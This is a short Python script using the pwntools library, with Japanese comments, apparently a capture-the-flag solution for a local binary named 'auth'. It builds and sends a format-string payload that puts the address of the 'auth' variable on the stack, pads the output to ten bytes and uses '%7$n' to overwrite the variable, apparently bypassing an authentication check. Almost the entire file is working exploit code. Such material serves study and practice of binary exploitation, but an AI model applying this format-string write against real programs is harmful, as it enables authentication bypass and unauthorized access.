# readelf -s auth | grep auth
# これでauth変数の位置が分かる
# 0x804c028

# また、入力は7個目の引数に現れる

import pwn

# 4bytes
AUTH = 0x0804c028

p = pwn.process('./auth')

payload = pwn.p32(AUTH)
payload += b'|' * 6	        # 4バイトの入力と6バイトの「|」を合わせて10バイトし、%nでauthに書き込む
payload += b'%7$n'

print(p.clean().decode('latin-1'))
p.sendline(payload)
print(p.clean().decode('latin-1'))
